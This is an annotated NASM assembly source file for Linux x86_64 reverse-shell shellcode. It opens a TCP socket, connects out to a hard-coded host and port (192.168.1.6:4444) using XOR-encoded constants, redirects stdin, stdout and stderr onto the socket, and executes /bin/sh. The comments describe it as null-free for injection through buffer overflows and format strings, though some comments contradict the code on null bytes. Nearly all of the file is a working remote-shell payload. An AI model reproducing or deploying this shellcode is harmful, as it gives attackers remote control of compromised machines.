; Linux x86_64 Reverse Shell Shellcode
; ======================================
; This shellcode creates a TCP connection to a remote host and spawns /bin/sh
; The shellcode is designed to be null-free for compatibility with string-based
; injection methods (buffer overflows, format strings, etc.)
;
; Syscalls used (x86_64 Linux):
;   - socket (41): Create a socket endpoint
;   - connect (42): Connect to a remote address
;   - dup2 (33): Duplicate file descriptors for stdin/stdout/stderr
;   - execve (59): Execute /bin/sh
;
; Size: ~82 bytes (IP-dependent due to XOR encoding)
; Platform: Linux x86_64
; Null bytes: None in socket/connect sections (intentional in execve for NULL terminators)

global _start

section .text
_start:
	; ============================================================================
	; STEP 1: Create TCP Socket
	; ============================================================================
	; Syscall: int socket(int domain, int type, int protocol)
	; Returns: file descriptor in RAX (or -1 on error)
	;
	; Arguments:
	;   RDI = domain (AF_INET = 2 for IPv4)
	;   RSI = type (SOCK_STREAM = 1 for TCP)
	;   RDX = protocol (0 = IP, kernel chooses TCP for SOCK_STREAM)
	;
	; We use push/pop instead of mov to save bytes and avoid null bytes
	; Each push/pop pair is 2 bytes vs mov reg,imm which is 5+ bytes

	push 41			; Push syscall number for socket
	pop rax		    	; RAX = 41 (socket syscall)
	push 2			; Push AF_INET constant
	pop rdi		    	; RDI = 2 (AF_INET - IPv4)
	push 1			; Push SOCK_STREAM constant
	pop rsi		    	; RSI = 1 (SOCK_STREAM - TCP socket)
	cdq			; Sign-extend EAX into EDX (clears RDX to 0)
				; This is a 1-byte instruction to zero RDX
				; RDX = 0 (protocol - let kernel decide)
	syscall			; Execute socket syscall
				; Returns: socket file descriptor in RAX

	; ============================================================================
	; STEP 2: Connect to Remote Host
	; ============================================================================
	; Syscall: int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; Returns: 0 on success, -1 on error
	;
	; Arguments:
	;   RDI = sockfd (socket file descriptor from previous syscall)
	;   RSI = pointer to sockaddr_in structure
	;   RDX = addrlen (size of sockaddr_in = 16 bytes)
	;
	; sockaddr_in structure (16 bytes):
	;   +0: sin_family (2 bytes) = AF_INET (0x0002)
	;   +2: sin_port (2 bytes) = port in network byte order (big-endian)
	;   +4: sin_addr (4 bytes) = IP address in network byte order
	;   +8: padding (8 bytes) = zeros (not used for IPv4)

	xchg edi, eax		; Move socket FD from EAX to EDI
				; XCHG is 1 byte vs MOV which is 2+ bytes
				; EDI now contains socket file descriptor
				; Upper 32 bits of RDI are zeroed automatically
	mov al, 42		; RAX = 42 (connect syscall number)
				; We only modify AL since upper bits are already 0
	mov esi, 0x0601a8c0	; sin_addr = 192.168.1.6
	push rsi			; push IP to stack
	mov esi, 0xa3eefffd	; port+family XORed
	xor esi, 0xffffffff	; Decode port=4444, AF_INET
	push rsi			; push port+family to stack
	; ----------------------------------------------------------------------------
	; IP:PORT INJECTION POINT
	; ----------------------------------------------------------------------------
	; The builder inserts instructions here to build sockaddr_in on the stack
	; Two 32-bit values are pushed to form the 16-byte structure:
	;
	; Push #1 (lower 32 bits): IP address in little-endian
	;   Example: 127.0.0.1 = 0x7f000001 -> stored as 0x0100007f
	;
	; Push #2 (upper 32 bits): sin_family + sin_port
	;   Bits 0-15: AF_INET (0x0002)
	;   Bits 16-31: port in network byte order
	;   Example: port 4444 (0x115c) -> network order 0x5c11
	;   Combined: 0x5c110002
	;
	; Null-byte avoidance:
	;   If the immediate values contain null bytes (0x00), XOR encoding is used:
	;   - Load XORed value into register
	;   - XOR with key to decode original value
	;   - Push to stack
	;
	; Example for 127.0.0.1:4444 (contains null bytes):
	;   mov esi, 0xfffefe81      ; IP XORed with 0xfefefefe
	;   xor esi, 0xfefefefe      ; Decode: 0xfffefe81 ^ 0xfefefefe = 0x0100007f
	;   push rsi                 ; Push decoded IP to stack
	;   mov esi, 0xa3eefffd      ; port+family XORed with 0xffffffff
	;   xor esi, 0xffffffff      ; Decode: 0xa3eefffd ^ 0xffffffff = 0x5c110002
	;   push rsi                 ; Push decoded port+family to stack
	;
	; For IPs without null bytes, direct mov without XOR is used:
	;   mov esi, 0xc0a80164      ; 192.168.1.100 (no null bytes)
	;   push rsi
	;   mov esi, 0xb8220002      ; port 8888 + AF_INET (after XOR if needed)
	;   push rsi
	; ----------------------------------------------------------------------------
	mov rsi, rsp		; RSI = pointer to sockaddr_in structure on stack
				; Stack now contains our 16-byte sockaddr_in
	mov dl, 16		; RDX = 16 (addrlen - size of sockaddr_in)
				; We use DL since upper bits are already 0
	syscall			; Execute connect syscall
				; If successful, socket is now connected to remote host

	; ============================================================================
	; STEP 3: Redirect Standard File Descriptors
	; ============================================================================
	; Syscall: int dup2(int oldfd, int newfd)
	; Purpose: Make stdin(0), stdout(1), and stderr(2) point to our socket
	; This allows commands to read from and write to the remote connection
	;
	; We call dup2 three times in a loop:
	;   dup2(sockfd, 2) -> stderr  points to socket
	;   dup2(sockfd, 1) -> stdout points to socket
	;   dup2(sockfd, 0) -> stdin  points to socket
	;
	; After this, any program we execute will have its I/O redirected through
	; the socket, allowing remote control

	push 2			; Push loop counter
	pop rsi			; RSI = 2 (start with stderr)
				; We'll decrement to handle stderr(2), stdout(1), stdin(0)

dup2Loop:
	mov al, 33		; RAX = 33 (dup2 syscall number)
				; We only modify AL since we know RAX < 256
	syscall		    	; Execute dup2(sockfd, rsi)
				; RDI still contains sockfd from connect
				; RSI contains current fd number (2, 1, or 0)
	dec sil		    	; Decrement RSI (SIL is low byte of RSI)
				; 2 -> 1 -> 0 -> -1 (0xFF)
	jns dup2Loop		; Jump if Not Sign: loop while RSI >= 0
				; When SIL becomes 0xFF (-1), sign flag is set, loop exits
				; This handles all three file descriptors efficiently

	; ============================================================================
	; STEP 4: Execute Shell
	; ============================================================================
	; Syscall: int execve(const char *pathname, char *const argv[], char *const envp[])
	; Purpose: Replace current process with /bin/sh
	;
	; Arguments:
	;   RDI = pointer to pathname string ("/bin/sh" or "//bin/sh")
	;   RSI = pointer to argv array (array of string pointers, NULL-terminated)
	;   RDX = pointer to envp array (environment variables, NULL-terminated)
	;
	; We use "//bin/sh" instead of "/bin/sh" to make it 8 bytes, which fits
	; perfectly in a 64-bit register. Linux treats "//bin/sh" same as "/bin/sh"
	;
	; String is stored in reverse (little-endian) in the register:
	;   //bin/sh -> 0x68732f6e69622f2f
	;   Breakdown: 0x68='h', 0x73='s', 0x2f='/', 0x6e='n', etc.

	mov al, 59		; RAX = 59 (execve syscall number)
	push 0			; Push NULL (0x00) to stack as string terminator
				; This creates a null byte but it's acceptable here as
				; it's used for NULL termination, not in shellcode flow
	mov rdi, 0x68732f6e69622f2f	; RDI = "//bin/sh" in reverse
				; Load the pathname string into RDI
	push rdi		; Push string to stack (now stack has "//bin/sh\0")
	mov rdi, rsp		; RDI = pointer to "//bin/sh" string on stack
				; This is the pathname argument
	push 0			; Push NULL for argv array terminator
				; Stack now: [NULL, "//bin/sh\0"]
	mov rsi, rsp		; RSI = pointer to argv array
				; argv[0] = NULL (we don't need to pass args)
	mov dl, 0	    	; RDX = 0 (NULL pointer for envp)
				; We use DL to generate the null byte instruction
				; This creates a null byte in the shellcode but it's
				; necessary for the NULL envp pointer
	syscall			; Execute execve syscall
				; If successful, this process is replaced by /bin/sh
				; The shell now has stdin/stdout/stderr connected to our socket
				; We have remote shell access!

